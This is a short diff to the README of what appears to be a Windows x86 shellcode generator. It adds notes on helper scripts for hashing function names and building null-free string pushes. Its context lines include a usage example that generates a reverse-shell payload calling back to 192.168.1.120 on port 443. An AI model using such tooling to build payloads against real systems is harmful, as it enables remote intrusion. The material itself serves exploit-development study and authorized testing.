@@ -28,7 +28,6 @@ options:
                         Function called to terminate shellcode
 ```
 
-
 ## Examples
 
 ### Reverse Shell
@@ -173,3 +172,7 @@ python3 win_x86_shellcoder.py -r -w reverse -i 192.168.1.120 -p 443
 ```
 python3 win_x86_shellcoder.py -b '\x00' loadcode -f code.txt
 ```
+
+# Other Helper scripts
+`hash.py` to get the hash of a function when resolving the funciton from the library. 
+`push_string,py` to get assembly code to push strings that are null-free and bad chars free. 
